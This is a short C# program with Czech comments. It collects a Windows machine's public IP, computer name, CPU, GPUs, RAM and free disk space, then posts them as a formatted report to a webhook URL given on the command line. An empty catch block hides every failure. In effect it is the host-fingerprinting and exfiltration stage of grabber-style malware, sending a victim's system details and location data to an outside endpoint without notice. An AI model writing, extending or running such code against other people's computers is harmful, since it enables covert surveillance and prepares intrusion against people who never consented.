using System;
using System.Net.Http;
using System.Text;
using System.Management;
using System.Collections.Generic;
using System.Linq;

public class Program
{
    public static void Main(string[] args)
    {
        try {
            string webhook = args[0];
            var client = new HttpClient();

            // 1. Získání IP (moderně přes HttpClient)
            string ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim();
            
            // 2. HW Info
            string pcName = Environment.MachineName;
            
            // CPU
            string cpu = "";
            using (var s = new ManagementObjectSearcher("select Name from Win32_Processor"))
                foreach (var obj in s.Get()) cpu = obj["Name"].ToString();

            // GPU (opraveno pro více grafik)
            var gpus = new List<string>();
            using (var s = new ManagementObjectSearcher("select Name from Win32_VideoController"))
                foreach (var obj in s.Get()) gpus.Add(obj["Name"].ToString());
            string gpuList = string.Join(", ", gpus);

            // RAM
            long mem = 0;
            using (var s = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
                foreach (var obj in s.Get()) mem += Convert.ToInt64(obj["Capacity"]);
            int ram = (int)(mem / 1024 / 1024 / 1024);

            // Disk
            var drive = new System.IO.DriveInfo("C");
            long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;

            // 3. Report & JSON
            string report = $"**REPORT: {pcName}**\\n---\\n**IP:** {ip}\\n**CPU:** {cpu}\\n**GPU:** {gpuList}\\n**RAM:** {ram}GB\\n**Disk C:** {disk}GB volných";
            string json = "{\"content\":\"" + report + "\"}";

            // 4. Odeslání
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            client.PostAsync(webhook, content).GetAwaiter().GetResult();
        }
        catch { }
    }
}
